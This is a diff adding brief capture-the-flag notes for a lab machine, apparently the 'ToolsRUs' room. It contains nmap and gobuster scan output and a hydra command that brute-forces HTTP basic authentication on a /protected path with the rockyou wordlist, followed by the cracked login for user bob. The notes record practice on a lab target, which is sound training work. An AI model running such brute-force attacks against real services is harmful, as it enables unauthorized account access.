@@ -1,0 +1,58 @@
+ToolsRUs
+
+ip address:10.10.242.209
+
+nmap:
+
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+1234/tcp open  hotline syn-ack ttl 63
+
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d1:79:c9:a2:c5:97:56:05:af:f5:4d:cb:42:5c:4a:1a (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEJwA1IUjrFlNm8LLoUNlnyDmDzoe9BRZvzCLdIe9bHegjcBi2Q3AQxymtccgD1VlJiaL/SpdfRXCElyh157jE5vIax/EDeVoOyF7HksDRdR3ODxhU+xZSjiE/o4WM50rV23e47cW5QDiJ7NGzbQ4nhIIZHZpewFGUoZ5yU0/SjnFjtDrW1y4l0eV19bpCQPD300inMWyocuutuLqlL3xeBUjuRiHvcPjvMJVfRn+I689tOgdj4stN+KzcDsq3D1j9OfrAhRq8oVS6TeW5cWi/BMpRIdI9vLIvq9UwZQpwz1SpVXt7HMn7fyfCjPH8KcvIyRY9w9nDd0J+QYayzGrZ
+|   256 65:8d:b6:f8:98:b5:88:33:b3:25:31:31:29:84:66:33 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL8UhdY5hh+U9I9GDgnXJYsHHpw4kSF+7KAZvgznVMMqOVrWd8i2GFv+E1eLFTrXynjZ03SG3rtZ6T5QQh0U2rc=
+|   256 79:c1:a6:e9:ad:da:af:aa:5d:aa:8a:60:31:3e:f3:fc (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKC4R2zFA7c9WG2LZp7jwjMT9+uFU97nZUDYzgI8qVsD
+80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+gobuster:
+.hta (Status: 403)
+/.hta.html (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.html (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.txt (Status: 403)
+/guidelines (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/protected (Status: 401)
+/server-status (Status: 403)
+
+Important file /protected
+
+hack the pass:
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -f $ip http-get /protected/ -t4 -V
+80][http-get] host: 10.10.242.209   login: bob   password: bubbles
